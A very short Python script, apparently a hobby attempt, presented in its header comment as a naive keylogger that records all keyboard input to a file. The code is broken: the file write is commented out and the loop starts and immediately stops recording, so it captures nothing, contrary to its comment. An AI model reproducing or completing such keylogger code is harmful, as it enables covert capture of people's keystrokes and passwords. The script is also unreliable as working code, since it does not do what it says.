# A very naive keylogger! Starts listening to input and writes everything out to a file.

import keyboard

# with open("output.txt", "a") as log_file:
while True:
    events = keyboard.start_recording()
    keyboard.stop_recording()

